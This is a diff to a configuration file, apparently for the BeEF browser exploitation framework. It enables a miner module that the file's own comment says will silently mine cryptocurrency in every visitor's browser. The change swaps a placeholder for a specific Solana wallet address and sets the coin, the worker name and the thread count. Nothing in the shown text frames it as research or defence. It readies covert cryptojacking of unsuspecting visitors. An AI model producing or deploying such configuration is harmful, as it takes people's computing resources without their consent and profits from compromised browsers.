@@ -9,7 +9,7 @@ beef:
             # will silently mine the chosen coin in every visitor's browser.
             # The stratum-ws proxy (miner-proxy/) must be running and accessible.
             miner:
-                wallet:      "YOUR_SOLANA_WALLET_HERE"
+                wallet:      "BedpPynJKjmHA7ZDkvbReYEKzTkb9WxLm3bncy5Hs6nw"
                 coin:        "SOL"
                 worker_name: "beef_hook"
                 threads:     2
